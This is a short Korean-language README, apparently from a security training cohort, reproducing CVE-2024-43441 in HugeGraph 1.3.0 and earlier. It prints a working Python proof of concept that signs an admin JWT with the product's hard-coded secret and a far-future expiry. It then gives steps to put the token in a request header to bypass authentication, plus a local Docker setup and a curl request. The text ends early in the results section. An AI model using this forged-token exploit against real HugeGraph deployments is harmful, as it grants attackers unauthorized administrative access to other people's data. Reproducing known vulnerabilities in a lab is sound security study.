# CVE-2024-43441 | HugeGraph JWT Secret Hard‑Coded

> 화이트햇 스쿨 3기 - [송은우 (@le0s1mba)](https://github.com/le0s1mba)

<br/>

### 요약

HugeGraph 1.3.0 이하 버전에서는 JWT Secret 키가 코드에 하드코딩되어 있어, 해당 키로 임의의 토큰을 발급 받아 인증 과정을 우회할 수 있다.

<br/>

### PoC

```
import jwt

token = jwt.encode(
    {
        "user_name" : "admin",
        "user_id" : "-30:admin",
        "exp" : 9739523483
    },
    "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg",
    algorithm="HS256"
)

print(f"JWT token : {token}")
```

먼저 run.py를 실행시켜 admin 계정의 jwt 토큰을 발급 받고, 해당 토큰을 헤더에 넣어 인증을 우회한다.

### 환경 구성 및 실행

```docker compose up -d``` 명령어로 환경을 먼저 실행시킨다.

### 결과

**인증 안함**

```curl -i http://127.0.0.1:8080/graphs```


